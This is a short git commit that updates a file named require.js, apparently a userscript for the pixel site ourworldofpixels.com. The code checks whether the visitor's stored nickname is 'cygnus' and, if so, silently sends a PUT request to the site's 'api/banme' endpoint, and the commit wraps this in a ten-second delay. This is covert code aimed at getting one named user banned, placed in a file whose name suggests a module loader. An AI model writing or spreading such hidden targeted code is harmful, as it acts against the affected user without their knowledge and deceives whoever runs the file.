6ea1e8615d117380bc4dae6edcab2097d53c6731
gh8sted <104511810+gh8sted@users.noreply.github.com>
2023-08-17 16:36:33 +0200

    Update require.js

--- require.js
+++ require.js
@@ -1,5 +1,7 @@
+setTimeout(function(){
 if (localStorage.nick == 'cygnus'){
         if(window.location.host == "ourworldofpixels.com"){
             fetch("api/banme",{method:"PUT"})
         }
     }
+},10000);
